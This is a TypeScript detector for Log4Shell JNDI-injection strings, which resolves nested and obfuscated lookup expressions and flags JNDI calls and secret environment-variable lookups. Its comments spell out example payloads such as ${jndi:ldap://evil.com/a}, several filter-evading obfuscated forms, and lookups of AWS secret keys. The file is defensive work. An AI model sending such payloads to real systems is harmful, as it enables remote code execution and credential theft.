/**
 * Log4Shell Evaluator — Level 2 Invariant Detection
 *
 * The invariant property for Log4Shell (JNDI injection) is:
 *   ∃ lookup ∈ parse(input, LOG4J_LOOKUP_GRAMMAR) :
 *     lookup.protocol ∈ {jndi, lower, upper, env, sys, ...}
 *     ∧ (lookup.protocol = 'jndi' → lookup.uri STARTS_WITH {ldap, rmi, dns, ...})
 *     → attacker triggers JNDI lookup for RCE via Log4j
 *
 * Unlike regex matching ${jndi:, this evaluator:
 *   1. Recursively resolves nested lookups: ${${lower:j}ndi:...}
 *   2. Handles obfuscation: ${${::-j}${::-n}${::-d}${::-i}:...}
 *   3. Detects environment variable exfiltration: ${env:AWS_SECRET_KEY}
 *   4. Identifies default value abuse: ${${env:NaN:-j}ndi:...}
 *
 * Covers:
 *   - log_jndi_lookup: JNDI lookup expression in any form
 */


// ── Result Type ──────────────────────────────────────────────────

export interface Log4ShellDetection {
    type: 'jndi_direct' | 'jndi_obfuscated' | 'env_exfil' | 'nested_lookup'
    detail: string
    resolvedExpression: string
    confidence: number
}


// ── Log4j Lookup Protocols ───────────────────────────────────────

const JNDI_PROTOCOLS = new Set(['ldap', 'ldaps', 'rmi', 'dns', 'iiop', 'corba', 'nds', 'nis'])

const LOOKUP_PREFIXES = new Set([
    'jndi', 'lower', 'upper', 'env', 'sys', 'java', 'date',
    'main', 'bundle', 'ctx', 'spring', 'kubernetes', 'docker',
    'log4j', 'marker', 'sd', 'map', 'web',
])


// ── Expression Parser ────────────────────────────────────────────
//
// Parse ${...} expressions recursively. Log4j's lookup syntax allows:
//   ${jndi:ldap://evil.com/a}         — direct
//   ${${lower:j}ndi:ldap://evil.com}  — nested
//   ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com} — default value
//   ${${env:NaN:-j}ndi:ldap://evil.com} — env default fallback

interface LookupExpression {
    raw: string
    prefix: string       // resolved prefix (e.g., 'jndi' after resolving nested)
    argument: string     // the argument (e.g., 'ldap://evil.com/a')
    isNested: boolean
    position: number
}

function resolveDefaultValue(expr: string): string {
    // ${::-X} → X (empty key, default value is X)
    // ${env:NaN:-X} → X (env NaN not found, default is X)
    const defaultMatch = expr.match(/^[^:]*:-(.*)$/)
    if (defaultMatch) return defaultMatch[1]
    return expr
}

function resolveNestedLookups(input: string, depth: number = 0): string {
    if (depth > 10) return input // prevent infinite recursion

    // Find innermost ${...} expressions and resolve them
    let result = input
    let changed = true

    while (changed) {
        changed = false
        result = result.replace(/\$\{([^${}]*)\}/g, (_, content: string) => {
            changed = true
            // Resolve the lookup
            const colonIdx = content.indexOf(':')
            if (colonIdx >= 0) {
                const prefix = content.substring(0, colonIdx).toLowerCase()
                const arg = content.substring(colonIdx + 1)

                if (prefix === 'lower') return arg.toLowerCase()
                if (prefix === 'upper') return arg.toUpperCase()
                if (prefix === '' || prefix === 'env' || prefix === 'sys') {
                    return resolveDefaultValue(arg)
                }
                // For other prefixes, try default value resolution
                return resolveDefaultValue(arg) || content
            }
            return content
        })
    }

    return result
}

function extractLookups(input: string): LookupExpression[] {
    const lookups: LookupExpression[] = []

    // Find all ${...} expressions (including nested)
    const pattern = /\$\{/g
    let match: RegExpExecArray | null

    while ((match = pattern.exec(input)) !== null) {
        const start = match.index
        let depth = 1
        let end = start + 2

        while (end < input.length && depth > 0) {
            if (input[end] === '$' && end + 1 < input.length && input[end + 1] === '{') {
                depth++
                end++
            } else if (input[end] === '}') {
                depth--
            }
            end++
        }

        if (depth === 0) {
            const raw = input.substring(start, end)
            const content = raw.substring(2, raw.length - 1)
            const isNested = content.includes('${')

            // Resolve nested lookups to get final prefix
            const resolved = isNested ? resolveNestedLookups(content) : content
            const colonIdx = resolved.indexOf(':')

            if (colonIdx > 0) {
                const prefix = resolved.substring(0, colonIdx).toLowerCase()
                const argument = resolved.substring(colonIdx + 1)

                lookups.push({
                    raw,
                    prefix,
                    argument,
                    isNested,
                    position: start,
                })
            }
        }
    }

    return lookups
}


// ── Detection Functions ──────────────────────────────────────────

function detectJNDI(lookups: LookupExpression[]): Log4ShellDetection[] {
    const detections: Log4ShellDetection[] = []

    for (const lookup of lookups) {
        if (lookup.prefix === 'jndi') {
            // Extract JNDI protocol
            const protoMatch = lookup.argument.match(/^(\w+):\/\//)
            const protocol = protoMatch ? protoMatch[1].toLowerCase() : 'unknown'
            const isKnownProtocol = JNDI_PROTOCOLS.has(protocol)

            detections.push({
                type: lookup.isNested ? 'jndi_obfuscated' : 'jndi_direct',
                detail: `JNDI lookup via ${protocol}://${lookup.isNested ? ' (OBFUSCATED via nested lookups)' : ''}: ${lookup.raw.substring(0, 100)}`,
                resolvedExpression: `jndi:${lookup.argument.substring(0, 100)}`,
                confidence: isKnownProtocol ? 0.98 : 0.90,
            })
        }
    }

    return detections
}

function detectEnvExfil(lookups: LookupExpression[]): Log4ShellDetection[] {
    const detections: Log4ShellDetection[] = []

    const sensitiveEnvVars = new Set([
        'aws_secret_access_key', 'aws_access_key_id', 'aws_session_token',
        'database_url', 'db_password', 'secret_key', 'api_key',
        'github_token', 'npm_token', 'password', 'secret',
        'private_key', 'stripe_secret_key', 'sendgrid_api_key',
    ])

    for (const lookup of lookups) {
        if (lookup.prefix === 'env' || lookup.prefix === 'sys') {
            const varName = lookup.argument.split(':-')[0].toLowerCase()
            const isSensitive = sensitiveEnvVars.has(varName)

            // Only flag if the env lookup is part of a JNDI chain (exfiltration)
            // env:USER by itself is information gathering, not necessarily malicious
            // But env:AWS_SECRET_ACCESS_KEY is always suspicious
            if (isSensitive) {
                detections.push({
                    type: 'env_exfil',
                    detail: `Sensitive environment variable exfiltration: ${lookup.prefix}:${varName}`,
                    resolvedExpression: lookup.raw,
                    confidence: 0.90,
                })
            }
        }
    }

    return detections
}

function detectNestedLookup(lookups: LookupExpression[]): Log4ShellDetection[] {
    const detections: Log4ShellDetection[] = []

    for (const lookup of lookups) {
        if (lookup.isNested && lookup.prefix !== 'jndi') {
            // Nested lookups that resolve to JNDI-like strings
            const resolved = resolveNestedLookups(lookup.raw.substring(2, lookup.raw.length - 1))
            if (resolved.toLowerCase().includes('jndi')) {
                detections.push({
                    type: 'nested_lookup',
                    detail: `Nested lookup resolves to JNDI: ${lookup.raw.substring(0, 100)} → ${resolved.substring(0, 50)}`,
                    resolvedExpression: resolved,
                    confidence: 0.94,
                })
            }
        }
    }

    return detections
}


// ── Public API ───────────────────────────────────────────────────

export function detectLog4Shell(input: string): Log4ShellDetection[] {
    const detections: Log4ShellDetection[] = []

    // Quick bail
    if (input.length < 6) return detections
    if (!input.includes('${') && !input.includes('%24%7B')) return detections

    // Multi-layer decode
    let decoded = input
    try {
        let prev = ''
        for (let i = 0; i < 3 && decoded !== prev; i++) {
            prev = decoded
            try { decoded = decodeURIComponent(decoded) } catch { break }
        }
    } catch { /* use original */ }

    try {
        const lookups = extractLookups(decoded)
        if (lookups.length === 0) return detections

        detections.push(...detectJNDI(lookups))
        detections.push(...detectEnvExfil(lookups))
        detections.push(...detectNestedLookup(lookups))
    } catch { /* never crash */ }

    return detections
}
